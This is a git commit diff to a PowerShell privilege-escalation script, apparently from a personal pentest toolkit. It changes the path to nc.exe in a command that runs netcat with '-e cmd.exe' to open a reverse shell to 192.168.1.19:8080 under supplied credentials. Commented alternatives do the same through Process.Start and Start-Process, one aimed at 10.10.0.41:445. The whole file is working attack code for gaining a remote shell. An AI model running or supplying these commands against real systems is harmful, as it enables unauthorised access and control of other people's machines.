da8d74c6417564bceb21d54960eb130fac2bb393
alecjmaly <alecjmaly@gmail.com>
2021-02-12 08:58:51 -0500

    updated

--- tools/privesc/windows_sudo_shell.ps1
+++ tools/privesc/windows_sudo_shell.ps1
@@ -6,8 +6,8 @@ $computer = 'localhost'
 $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
 $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
 
-Invoke-Command -ScriptBlock { C:\Users\alecm\Desktop\shared_kali\nc.exe 192.168.1.19 8080 -e cmd.exe } -Credential $credential -computername $computer
+Invoke-Command -ScriptBlock { C:\Users\Public\Downloads\nc.exe 192.168.1.19 8080 -e cmd.exe } -Credential $credential -computername $computer
 
 # ALTERNATIVE METHODS TO EXECUTE
-# [System.Diagnostics.Process]::Start("C:\Users\alecm\Desktop\shared_kali\nc.exe","192.168.1.19 8080 -e cmd.exe", $mycreds.Username, $mycreds.Password, $computer)
+# [System.Diagnostics.Process]::Start("C:\Users\Public\Downloads\nc.exe","192.168.1.19 8080 -e cmd.exe", $credential.Username, $credential.Password, $computer)
 # Start-Process -FilePath C:\Users\Public\downloads\nc.exe -NoNewWindow -Credential $credential -ArgumentList ('10.10.0.41','445','-e','cmd.exe') -WorkingDirectory C:\Users\Publc\downloads
